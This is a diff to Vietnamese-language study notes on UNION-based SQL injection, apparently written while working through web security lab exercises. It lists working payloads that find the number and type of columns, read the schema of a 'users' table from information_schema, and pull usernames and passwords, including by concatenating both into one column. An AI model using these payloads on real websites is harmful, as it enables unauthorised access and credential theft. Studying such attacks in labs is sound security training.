@@ -72,3 +72,24 @@ VD:
 '+UNION+SELECT+'abcd',NULL,NULL--
 '+UNION+SELECT+NULL,'abcd',NULL--
 '+UNION+SELECT+NULL,NULL,'abcd'--
+
+@GET username , password từ table user
+#Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản
+#Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham số danh mục:
+' UNION SELECT 'abcd','XYZ'--
+#xem trong bảng users có những cột gì
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
+#Lấy username, password
+'+UNION+SELECT+username,password+FROM+users--
+
+@Truy xuất nhiều giá trị trong một cột
+#Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản .
+Xác minh rằng truy vấn trả về hai cột, trong đó chỉ có một cột chứa văn bản, bằng cách sử dụng tải trọng như sau trong category tham số:
+'+UNION+SELECT+NULL,'abc'--
+#Lấy nội dung của table users
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+||'~'|| dùng để ngăn cách username , password bằng dấu ~
+
+
+
+
